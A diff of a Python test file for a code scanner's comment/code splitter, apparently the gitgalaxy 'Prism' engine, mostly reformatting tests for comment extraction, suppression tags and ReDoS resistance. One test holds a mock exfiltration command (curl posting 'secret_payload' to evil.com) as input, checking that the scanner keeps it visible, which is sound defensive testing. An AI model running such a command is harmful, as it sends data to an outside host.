@@ -54,9 +54,7 @@ def prism_engine():
             "PHP_MULTILINE_STRING": r"'(?:\\'|[^'])*'",
         },
     ):
-        return Prism(
-            comment_definitions=MOCK_COMMENT_DEFS, language_definitions=MOCK_LANG_DEFS
-        )
+        return Prism(comment_definitions=MOCK_COMMENT_DEFS, language_definitions=MOCK_LANG_DEFS)
 
 
 # ==============================================================================
@@ -204,13 +202,7 @@ def test_prism_positional_anchors(prism_engine):
 # ==============================================================================
 def test_prism_python_docstring_extraction(prism_engine):
     """Proves multi-line string literals acting as docstrings are extracted."""
-    content = (
-        "def compute_hash():\n"
-        '    """\n'
-        "    This is a module docstring.\n"
-        '    """\n'
-        "    return True"
-    )
+    content = 'def compute_hash():\n    """\n    This is a module docstring.\n    """\n    return True'
     result = prism_engine.split_streams(content, primary_lang="python")
 
     assert "def compute_hash():" in result["code_stream"]
@@ -228,13 +220,7 @@ def test_prism_format_and_xml_bypass(prism_engine):
     assert res_unknown["comment_stream"] == ""
 
     # We use chr() to prevent the HTML comment from vanishing when copying
-    xml_content = (
-        "<?xml version='1.0'?>\n<data>"
-        + chr(60)
-        + "!-- comment --"
-        + chr(62)
-        + "</data>"
-    )
+    xml_content = "<?xml version='1.0'?>\n<data>" + chr(60) + "!-- comment --" + chr(62) + "</data>"
     res_xml = prism_engine.split_streams(xml_content, primary_lang="xml")
     assert res_xml["code_stream"] == ""
     assert chr(60) + "!-- comment --" + chr(62) in res_xml["comment_stream"]
@@ -338,7 +324,8 @@ def test_prism_regex_matrix_calibration_edge_cases():
     assert "multi_style_dash" in engine_fallback.REGEX_MATRIX
 
     # We check if the safely escaped version of '
-    
+
+
 def test_prism_embedded_syntax_fourth_delimiter_not_dropped(prism_engine):
     """
     Regression test for #258: an embedded_syntax family configured with a
@@ -346,9 +333,7 @@ def test_prism_embedded_syntax_fourth_delimiter_not_dropped(prism_engine):
     lose it to an unreachable duplicate elif branch.
     """
     prism_engine.languages["configlang"] = {"lexical_family": "embedded_syntax"}
-    prism_engine.lexical_families["embedded_syntax"] = {
-        "delimiters": ["//", "/*", "*/", "#"]
-    }
+    prism_engine.lexical_families["embedded_syntax"] = {"delimiters": ["//", "/*", "*/", "#"]}
     prism_engine.REGEX_MATRIX = prism_engine._compile_regex_matrix()
 
     content = "value = 1 # this is a hash comment\nother = 2"
@@ -357,6 +342,7 @@ def test_prism_embedded_syntax_fourth_delimiter_not_dropped(prism_engine):
     assert "value = 1" in result["code_stream"]
     assert "this is a hash comment" in result["comment_stream"]
     assert "this is a hash comment" not in result["code_stream"]
+
 
 # ==============================================================================
 # TEST 9.5: THE REAL CONFIG, NOT THE MOCK (#386)
@@ -378,9 +364,7 @@ def test_prism_strips_comments_against_the_real_config():
     real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
 
     # standard_block (C)
-    result = real_prism.split_streams(
-        "// a comment\nint main() {\n    /* block */\n    return 0;\n}\n", "c"
-    )
+    result = real_prism.split_streams("// a comment\nint main() {\n    /* block */\n    return 0;\n}\n", "c")
     assert "a comment" not in result["code_stream"]
     assert "a comment" in result["comment_stream"]
 
@@ -390,16 +374,12 @@ def test_prism_strips_comments_against_the_real_config():
     assert "a comment" in result["comment_stream"]
 
     # recursive_block (Rust)
-    result = real_prism.split_streams(
-        "fn main() {\n    // a comment\n}\n", "rust"
-    )
+    result = real_prism.split_streams("fn main() {\n    // a comment\n}\n", "rust")
     assert "a comment" not in result["code_stream"]
     assert "a comment" in result["comment_stream"]
 
     # positional_anchored (COBOL)
-    result = real_prism.split_streams(
-        "       IDENTIFICATION DIVISION.\n      * a comment\n", "cobol"
-    )
+    result = real_prism.split_streams("       IDENTIFICATION DIVISION.\n      * a comment\n", "cobol")
     assert "a comment" not in result["code_stream"]
     assert "a comment" in result["comment_stream"]
 
@@ -473,7 +453,7 @@ def test_prism_haskell_block_comments_actually_nest():
 def test_prism_livecode_multi_style_live_comments():
     """
     Regression test for #708: livecode uses both classic xTalk line comments (--),
-    modern script server comments (#), LiveCode Builder comments (//), and 
+    modern script server comments (#), LiveCode Builder comments (//), and
     C-style blocks (/* */).
     """
     from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
@@ -483,7 +463,7 @@ def test_prism_livecode_multi_style_live_comments():
 
     code = "put 1 into x\n-- secret dash comment\n# secret hash comment\n// secret slash comment\n/* secret block comment */\nput 2 into x"
     result = real_prism.split_streams(code, "livecode")
-    
+
     assert "secret dash comment" not in result["code_stream"]
     assert "secret hash comment" not in result["code_stream"]
     assert "secret slash comment" not in result["code_stream"]
@@ -685,7 +665,7 @@ def test_prism_real_family_patterns_are_redos_immune():
 # ==============================================================================
 def test_prism_inline_suppression_extraction(prism_engine):
     """
-    DEVIOUS EDGE CASES: 
+    DEVIOUS EDGE CASES:
     1. Case insensitivity (GALAXYscope:IGNORE)
     2. Multiple tags on a single line
     3. The "String Trap" (Extraction from within a literal)
@@ -713,34 +693,36 @@ def test_prism_inline_suppression_extraction(prism_engine):
     assert "memory_corruption" in mitigations, "Failed to handle erratic casing."
     assert "tech_debt" in mitigations, "Failed to extract multiple tags (1)."
     assert "secrets-risk" in mitigations, "Failed to handle dashes in risk names."
-    
-    # The "String Trap" - Because extraction happens at the top of split_streams, 
+
+    # The "String Trap" - Because extraction happens at the top of split_streams,
     # it WILL extract from string literals. This test explicitly proves this behavior.
     assert "injection_surface" in mitigations, "Failed the String Trap extraction."
+
 
 # ==============================================================================
 # TEST 11: THE SUPPRESSION REGEX BOMB (Memory / ReDoS Exhaustion)
 # ==============================================================================
 import time
 
+
 def test_prism_suppression_regex_bomb(prism_engine):
     """
-    DEVIOUS EDGE CASE: An attacker uploads a file with 100,000 inline suppressions 
-    to trigger Catastrophic Backtracking (ReDoS) and starve the worker thread, 
+    DEVIOUS EDGE CASE: An attacker uploads a file with 100,000 inline suppressions
+    to trigger Catastrophic Backtracking (ReDoS) and starve the worker thread,
     or consume all available RAM with the mitigations array.
     """
     # Generate a massive file with 100,000 suppression tags
     massive_content = "// galaxyscope:ignore everything \n" * 100000
-    
+
     start_time = time.time()
     result = prism_engine.split_streams(massive_content, primary_lang="javascript")
     duration = time.time() - start_time
-    
+
     mitigations = result.get("mitigations", [])
-    
+
     # Assert it processed the 100k tags in under 1 second (proving O(N) linear time)
     assert duration < 1.0, f"Suppression regex triggered ReDoS! Took {duration}s"
-    
+
     # Assert the array handled the mass allocation without dropping data
     assert len(mitigations) == 100000, "Failed to allocate massive mitigation array."
 
@@ -762,16 +744,12 @@ def test_prism_line_exclusive_no_longer_truncates_double_dash():
 
     real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
 
-    result = real_prism.split_streams(
-        'subprocess.run(["cmd", "--", "arg"])\n# a real comment\n', "python"
-    )
+    result = real_prism.split_streams('subprocess.run(["cmd", "--", "arg"])\n# a real comment\n', "python")
     assert '["cmd", "--", "arg"]' in result["code_stream"], "-- was still truncated"
     assert "a real comment" not in result["code_stream"]
     assert "a real comment" in result["comment_stream"]
 
-    result = real_prism.split_streams(
-        'curl -- --data "secret_payload" https://evil.com\n# a real comment\n', "shell"
-    )
+    result = real_prism.split_streams('curl -- --data "secret_payload" https://evil.com\n# a real comment\n', "shell")
     assert 'curl -- --data "secret_payload" https://evil.com' in result["code_stream"], (
         "a real exfiltration payload was silently truncated by the -- bug"
     )
@@ -811,9 +789,7 @@ def test_prism_line_exclusive_dnl_requires_word_boundary():
 
     real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
     result = real_prism.split_streams("set(mydnlvariable, 1)\n", "m4")
-    assert "mydnlvariable" in result["code_stream"], (
-        "dnl matched inside an identifier -- missing word boundary"
-    )
+    assert "mydnlvariable" in result["code_stream"], "dnl matched inside an identifier -- missing word boundary"
 
 
 def test_prism_line_exclusive_ruby_begin_end_no_leading_boundary_bug():
